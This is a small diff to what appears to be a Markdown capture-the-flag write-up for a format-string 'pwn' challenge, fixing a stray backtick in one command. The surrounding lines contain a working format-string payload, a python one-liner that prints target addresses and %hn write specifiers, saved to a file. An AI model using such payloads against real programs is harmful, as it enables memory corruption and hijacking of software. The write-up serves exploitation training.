@@ -1266,7 +1266,7 @@ python -c 'print "\x2a\xc0\x04\x08\x28\xc0\x04\x08%2044x%7$hn%35318x%8$hn"'
 
 So basically our final payload is `python -c 'print "\x2a\xc0\x04\x08\x28\xc0\x04\x08%2044x%7$hn%35318x%8$hn"'` 
 
-We can run it then output it in a file `python -c `'print "\x2a\xc0\x04\x08\x28\xc0\x04\x08%2044x%7$hn%35318x%8$hn"' > payload`
+We can run it then output it in a file `python -c 'print "\x2a\xc0\x04\x08\x28\xc0\x04\x08%2044x%7$hn%35318x%8$hn"' > payload`
 
 ```                                         
 ┌──(venv)─(mark㉿haxor)-[~/…/CTF/Sabr/pwn/fsbeZ]
